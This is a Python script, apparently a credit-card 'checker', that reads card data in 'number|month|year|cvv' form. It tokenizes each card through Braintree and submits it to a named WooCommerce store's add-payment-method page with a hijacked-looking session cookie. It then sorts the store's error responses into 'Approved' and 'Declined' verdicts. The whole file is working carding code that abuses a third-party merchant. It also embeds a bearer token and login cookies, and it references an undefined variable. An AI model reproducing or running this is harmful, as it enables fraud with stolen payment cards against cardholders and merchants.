import requests,re
from bs4 import BeautifulSoup
import time
def Tele(ccx):
    import requests
    ccx=ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:#Mo3gza
        yy = yy.split("20")[1]
    r = requests.session()
    import requests

    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjY0NjY5OTIsImp0aSI6IjI4M2FmOTg0LTg0MTItNDlmYS04Y2ExLTdhZDA1ZGYxODZkNSIsInN1YiI6Im1rbWZiaGI2ZDJoOTUzcXciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im1rbWZiaGI2ZDJoOTUzcXciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.Vp1QSq6Wx2nUff8P77_g6CFAJWY6HNl8EL1GGy8MOc6M8waUvreBFn4wr2U8WxZW4vif-qMmTreWSFXpOb8log',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'priority': 'u=1, i',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': '4d1c2527-2d7e-4704-8606-bdf477acc771',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': n,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv':cvc,
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

    import requests

    cookies = {
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2024-09-15%2006%3A07%3A56%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.yazoomills.com%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_first_add': 'fd%3D2024-09-15%2006%3A07%3A56%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.yazoomills.com%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F126.0.0.0%20Safari%2F537.36',
        '_gcl_au': '1.1.1405361596.1726380492',
        '__utmzz': 'utmccn=(not set)',
        '__utmzzses': '1',
        '_gid': 'GA1.2.82329862.1726380493',
        '_clck': 'mjideo%7C2%7Cfp7%7C0%7C1719',
        'brandcdn_uid': 'a16cad07-348d-4afc-8ab9-4fe9f14ea121',
        'pum-61408': 'true',
        'wordpress_logged_in_29d4bb5994f0ca859e9db957c5c93aee': 'mohamedrafgbfmdadanbard%7C1727590111%7CUdxSJUFjjKt1X7pyG0FVaLlFP2TD7EU3DfIafU99knH%7C1d81999214ed67d7b7fc0cf36be38a92d74648b96ef8b0e1b840ed67a43abb7a',
        'wp_automatewoo_visitor_29d4bb5994f0ca859e9db957c5c93aee': '0zrz3cm07jf62i35wbm8',
        'wp_automatewoo_session_started': '1',
        'wfwaf-authcookie-353b44fd2d0fa5951e3540788f9b2103': '6144%7Cother%7Cread%7C7cb7bfbca3f71f1075935a46435217d405c32629fa6ac738bbdf71267b5ea5df',
        'tk_ai': '6PP595BLPwTntmyumkNHrjZC',
        'sbjs_session': 'pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fadd-payment-method%2F',
        '_ga_JT1Y3HZ65M': 'GS1.1.1726380492.1.1.1726380590.0.0.0',
        '_ga': 'GA1.2.1925812915.1726380493',
        '_gat_UA-2829389-2': '1',
        '_gat_UA-2829389-1': '1',
        '_uetsid': 'e30eae00732811ef830865fa0ebbbf16',
        '_uetvid': 'e30f7f30732811ef84ca2359c05a8dba',
        '_clsk': '1limzxo%7C1726380591278%7C7%7C1%7Cv.clarity.ms%2Fcollect',
        'tk_qs': '',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-15%2006%3A07%3A56%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.yazoomills.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-15%2006%3A07%3A56%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.yazoomills.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F126.0.0.0%20Safari%2F537.36; _gcl_au=1.1.1405361596.1726380492; __utmzz=utmccn=(not set); __utmzzses=1; _gid=GA1.2.82329862.1726380493; _clck=mjideo%7C2%7Cfp7%7C0%7C1719; brandcdn_uid=a16cad07-348d-4afc-8ab9-4fe9f14ea121; pum-61408=true; wordpress_logged_in_29d4bb5994f0ca859e9db957c5c93aee=mohamedrafgbfmdadanbard%7C1727590111%7CUdxSJUFjjKt1X7pyG0FVaLlFP2TD7EU3DfIafU99knH%7C1d81999214ed67d7b7fc0cf36be38a92d74648b96ef8b0e1b840ed67a43abb7a; wp_automatewoo_visitor_29d4bb5994f0ca859e9db957c5c93aee=0zrz3cm07jf62i35wbm8; wp_automatewoo_session_started=1; wfwaf-authcookie-353b44fd2d0fa5951e3540788f9b2103=6144%7Cother%7Cread%7C7cb7bfbca3f71f1075935a46435217d405c32629fa6ac738bbdf71267b5ea5df; tk_ai=6PP595BLPwTntmyumkNHrjZC; sbjs_session=pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fadd-payment-method%2F; _ga_JT1Y3HZ65M=GS1.1.1726380492.1.1.1726380590.0.0.0; _ga=GA1.2.1925812915.1726380493; _gat_UA-2829389-2=1; _gat_UA-2829389-1=1; _uetsid=e30eae00732811ef830865fa0ebbbf16; _uetvid=e30f7f30732811ef84ca2359c05a8dba; _clsk=1limzxo%7C1726380591278%7C7%7C1%7Cv.clarity.ms%2Fcollect; tk_qs=',
        'origin': 'https://www.yazoomills.com',
        'priority': 'u=0, i',
        'referer': 'https://www.yazoomills.com/my-account/add-payment-method/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }

    data = {
        'payment_method': 'braintree_credit_card',
        'wc-braintree-credit-card-card-type': 'visa',
        'wc-braintree-credit-card-3d-secure-enabled': '',
        'wc-braintree-credit-card-3d-secure-verified': '',
        'wc-braintree-credit-card-3d-secure-order-total': '0.00',
        'wc_braintree_credit_card_payment_nonce':tok,
        'wc_braintree_device_data': '{"correlation_id":"1fdb6b89b34b7e75ecb00ba9694e7fc4"}',
        'wc-braintree-credit-card-tokenize-payment-method': 'true',
        'woocommerce-add-payment-method-nonce': '962b73c74c',
        '_wp_http_referer': '/my-account/add-payment-method/',
        'woocommerce_add_payment_method': '1',
    }

    response = requests.post('https://www.yazoomills.com/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)
    msg=(response.text)
    import re
    soup = BeautifulSoup(msg, 'html.parser')
    
    # البحث عن رسالة الخطأ
    error_message_element = soup.find('ul', class_='woocommerce-error')
    success_message_element = soup.find('div', class_='woocommerce-message')

    result = ""
    response_text = ""

    # التحقق من رسالة الخطأ
    if error_message_element:
        error_message = error_message_element.find('li').text.strip()

        if 'Status code 2001: Insufficient Funds (51 : DECLINED)' in error_message:
            result = "1000: Approved"
            return "Payment method successfully added."
        
        elif 'risk_threshold' in error_message:
            result = "RISK: Retry this BIN later."
            return "risk_threshold"
        
        elif 'Processor Declined' in error_message:
            result = "Declined"
            return "Processor Declined"
        
        elif 'Status code 2015: Transaction Not Allowed (57 : TRAN NOT ALLOWED)' in error_message:
            result = "Declined"
            return "Transaction Not Allowed"
        
        elif 'Status code 2108: Closed Card (51 : DECLINED)' in error_message:
            result = "Declined"
            return "Closed Card"
        
        elif 'Status code 2007: No Account (14 : INV ACCT NUM)' in error_message:
            result = "Declined"
            return "No Account"

        elif 'Gateway Rejected' in error_message:
            result = "Declined"
            return "Gateway Rejected"    

        elif 'Status code 2004: Expired Card (54 : EXPIRED CARD)' in error_message:
            result = "Declined"
            return "Expired Card"
        
        elif 'Status code 81724: Duplicate card exists in the vault' in error_message:
            result = "1000: Approved"
            return "Duplicate card exists in the vault"
        
        elif 'Status code 2047: Call Issuer. Pick Up Card. (57 : TRAN NOT ALLOWED)' in error_message:
            result = "Declined"
            return "Call Issuer. Pick Up Card"
        
        elif 'Status code 2000: Do Not Honor (51 : DECLINED)' in error_message:
            result = "Declined"
            return "Do Not Honor"

        elif 'CVV' in error_message:
            return "Card Issuer Declined CVV"

        elif 'Security Violation' in error_message:
            result = "Declined"
            return "Security Violation"
        
        elif 'Card Not Activated' in error_message:
            result = "Declined"
            return "Card Not Activated"
        
        elif 'Declined - Call Issuer' in error_message:
            result = "Declined"
            return "Declined - Call Issuer"
        
        elif '(Life cycle)' in error_message:
            result = "Declined"
            return "Authorize at this time (Life cycle)"
        
        elif '(Policy)' in error_message:
            result = "Declined"
            return "Authorize at this time (Policy)"
        
        elif 'Cardholder' in error_message:
            result = "Declined"
            return  "Cardholder"
        
        elif 'No Such Issuer' in error_message:
            result = "Declined"
            return "No Such Issuer"
        
        elif 'merchant' in error_message:
            result = "Declined"
            return "Not accepted by this merchant account"
        
        else:
            result = "Declined"
            return f"{error_message}"
    # التحقق من رسالة النجاح
    if success_message_element:
        success_message = success_message_element.text.strip()
        result = "1000: Approved"
        return "Payment method successfully added."
